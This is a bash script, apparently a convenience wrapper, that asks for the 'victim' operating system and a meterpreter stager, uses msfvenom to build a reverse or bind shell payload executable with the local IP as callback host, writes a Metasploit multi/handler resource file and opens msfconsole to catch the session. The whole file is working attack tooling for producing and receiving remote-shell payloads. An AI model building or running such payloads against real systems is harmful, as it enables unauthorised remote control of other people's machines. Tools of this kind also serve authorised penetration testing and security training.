#!/bin/bash

function choose_os {
	PS3="Choose operating system of victim: "
	select os in Windows OSX Linux Exit; do
		case $os in
			Windows) 
				echo "[+] You have chosen $os!"
				stage="$(echo "$os" | tr '[:upper:]' '[:lower:]')/"
				ftype="exe"
				break
				;;
			OSX | Linux) 
				echo "[+] You have chosen $os!"
				stage="$(echo "$os" | tr '[:upper:]' '[:lower:]')/x64/"
				if [[ "$os" = "OSX" ]]; then
					ftype="macho"
				else
					ftype="elf"
				fi
				break
				;;
			Exit) 
				echo "[X] Exiting... thank you and have a nice day"
				exit
				;;
			*) 
				echo "[-_-\"] Well, that ain't right! Try again!"
				;;
		esac
	done
	}

function construct_stager {
	echo "[+] You have chosen $stager!"
	stager="$(echo "$stager" | tr '[:upper:]' '[:lower:]'| sed 's. ._.')"
	}

function choose_stager {
	PS3="Choose your stager: "
	select stager in "Reverse TCP" "Bind TCP" "Reverse HTTP" "Reverse HTTPS" Exit; do
		case $stager in
			"Reverse TCP" | "Bind TCP") 
				construct_stager
				stager=$"meterpreter/$stager"
				break
				;;
			"Reverse HTTP" | "Reverse HTTPS")
				construct_stager
				stager="meterpreter_$stager"
				break
				;;
			Exit) 
				echo "[X] Exiting... thank you and have a nice day"
				exit
				;;
			*) 
				echo "[-_-\"] Well, that ain't right! Try again!"
				;;
		esac
	done
	}

function name_file {
	read -p "Please name your payload: " name
	read -p "Please select a port: " lport
	if [[ -f "$name$lport.$ftype" ]]; then
		echo "Payload name taken! Try again"
		name_file
	fi
	}

function make_payload {
	if [[ -d  "payloads" ]]; then
		echo "payloads directory exists... changing directory now."
		cd "payloads"
	else
		mkdir "payloads"
		echo "payloads directory created... changing directory now."
		cd "payloads"
	fi
	
	curr_ip=$(hostname -I | cut -d " " -f 1)
	
	"$1"
	
	if [[ "$stager" = "bind_tcp" ]]; then
		msfvenom -p "$stage$stager" lport="$lport" -f "$ftype" -o "$name$lport.$ftype"
	else
		msfvenom -p "$stage$stager" lhost="$curr_ip" lport="$lport" -f "$ftype" -o "$name$lport.$ftype"
	fi
	}

function create_rc_file {
	echo "use exploit/multi/handler" > listen"_$os$name$lport".rc
	echo "set payload $stage$stager" >> listen"_$os$name$lport".rc
	echo "set lhost $curr_ip" >> listen"_$os$name$lport".rc
	echo "set lport $lport" >> listen"_$os$name$lport".rc
	echo "exploit" >> listen"_$os$name$lport".rc
	}

function countdown {
	i=5
	while [ $i -ge 0 ] ;do
         echo $i
         i=$(( "$i"-1 ))
         sleep 1s
	done
	}

function begin {
clear
echo "Welcome to the msfvenom payload generator - now with extra bite!"
echo

choose_os

choose_stager

make_payload name_file

echo "Payload $name$lport.$ftype Created in $PWD"

create_rc_file
echo "listen_$os$name$lport.rc file created"

echo "msfconsole opening in T-5 seconds: "

countdown; msfconsole -r listen"_$os$name$lport".rc
	}

begin
